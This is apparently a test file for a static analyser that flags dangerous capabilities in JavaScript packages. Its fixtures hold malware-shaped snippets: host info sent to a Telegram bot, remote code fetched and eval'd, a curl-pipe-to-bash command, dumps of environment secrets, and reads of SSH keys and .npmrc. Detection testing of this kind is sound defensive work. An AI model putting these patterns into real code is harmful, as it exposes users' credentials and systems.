import assert from 'node:assert/strict';
import { test } from 'node:test';
import { extractCapabilities } from '../src/static/capabilities.js';
import { parseSource } from '../src/static/parse.js';

function analyse(source) {
  const ast = parseSource(source);
  assert.ok(ast, 'fixture must parse');
  return extractCapabilities(ast, source, 'index.js');
}

const byCapability = (findings, capability) => findings.filter((finding) => finding.capability === capability);

test('AsyncAPI shape: module-scope detached spawn is import-time execution', () => {
  const source = `
    const { spawn } = require('child_process');
    const path = require('path');
    spawn('node', [path.join(__dirname, 'sync.js')], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
  `;
  const findings = analyse(source);
  const spawn = byCapability(findings, 'process.spawn');
  assert.equal(spawn.length, 1);
  assert.equal(spawn[0].scope, 'module');
  assert.equal(byCapability(findings, 'process.detached').length, 1);
});

test('indexed-btree shape: loader inside a prototype method is method scope', () => {
  const source = `
    const os = require('os');
    const https = require('https');
    function BTree() {}
    BTree.prototype.set = function (key, value) {
      if (key === 'magic') {
        const info = { h: os.hostname(), u: os.userInfo() };
        https.request('https://api.telegram.org/bot123/sendMessage', () => {}).end(JSON.stringify(info));
      }
      return this;
    };
    module.exports = BTree;
  `;
  const findings = analyse(source);
  const net = byCapability(findings, 'net.outbound');
  assert.equal(net.length, 1);
  assert.equal(net[0].scope, 'method');
  assert.equal(net[0].enclosing, 'BTree.prototype.set');
  assert.equal(byCapability(findings, 'os.fingerprint').length, 1);
  const indicators = byCapability(findings, 'indicator.c2');
  assert.ok(indicators.some((finding) => finding.indicator === 'telegram'));
});

test('IIFE at module level still counts as module scope', () => {
  const source = `
    (async () => {
      const res = await fetch('https://ipfs.io/ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG');
      eval(await res.text());
    })();
  `;
  const findings = analyse(source);
  assert.equal(byCapability(findings, 'net.outbound')[0].scope, 'module');
  assert.equal(byCapability(findings, 'code.dynamic')[0].scope, 'module');
  assert.ok(byCapability(findings, 'indicator.c2').some((finding) => finding.indicator === 'ipfs'));
});

test('environment enumeration and sensitive keys are distinguished', () => {
  const source = `
    const dump = JSON.stringify(process.env);
    const token = process.env.NPM_TOKEN;
    const home = process.env.HOME;
  `;
  const findings = analyse(source);
  assert.equal(byCapability(findings, 'env.enumerate').length, 1);
  assert.equal(byCapability(findings, 'env.sensitive').length, 1);
});

test('ESM imports resolve through the binding table', () => {
  const source = `
    import { execSync } from 'node:child_process';
    export function build() { return execSync('curl -s https://1.2.3.4/x.sh | bash'); }
  `;
  const findings = analyse(source);
  const spawn = byCapability(findings, 'process.spawn');
  assert.equal(spawn.length, 1);
  assert.equal(spawn[0].scope, 'function');
  assert.equal(byCapability(findings, 'process.shell-download').length, 1);
  assert.ok(byCapability(findings, 'indicator.c2').some((finding) => finding.indicator === 'raw-ip-url'));
});

test('benign pure helper yields no dangerous capabilities', () => {
  const source = `
    export function debounce(fn, ms) {
      let timer;
      return (...args) => { clearTimeout(timer); timer = setTimeout(() => fn(...args), ms); };
    }
  `;
  assert.equal(analyse(source).length, 0);
});

test('decode chain and obfuscated identifiers are reported', () => {
  const source = `
    var _0x4f2a = ['aHR0cHM6Ly9leGFtcGxlLmNvbQ=='], _0x1b3c = 1, _0x9d8e = 2, _0x7c6f = 3, _0x2e5d = 4;
    const url = Buffer.from(_0x4f2a[0], 'base64').toString();
    new Function('return ' + url)();
  `;
  const findings = analyse(source);
  assert.equal(byCapability(findings, 'decode.base64').length, 1);
  assert.equal(byCapability(findings, 'code.dynamic').length, 1);
  assert.equal(byCapability(findings, 'obfuscation.identifiers').length, 1);
});

test('sensitive file reads are flagged, ordinary reads are not', () => {
  const source = `
    const fs = require('fs');
    const key = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');
    const cfg = fs.readFileSync('./config.json');
  `;
  const findings = analyse(source);
  assert.equal(byCapability(findings, 'fs.read-sensitive').length, 0, 'path built at runtime is not a literal');
  const literal = analyse(`const fs = require('fs'); fs.readFileSync('/home/u/.npmrc');`);
  assert.equal(byCapability(literal, 'fs.read-sensitive').length, 1);
});
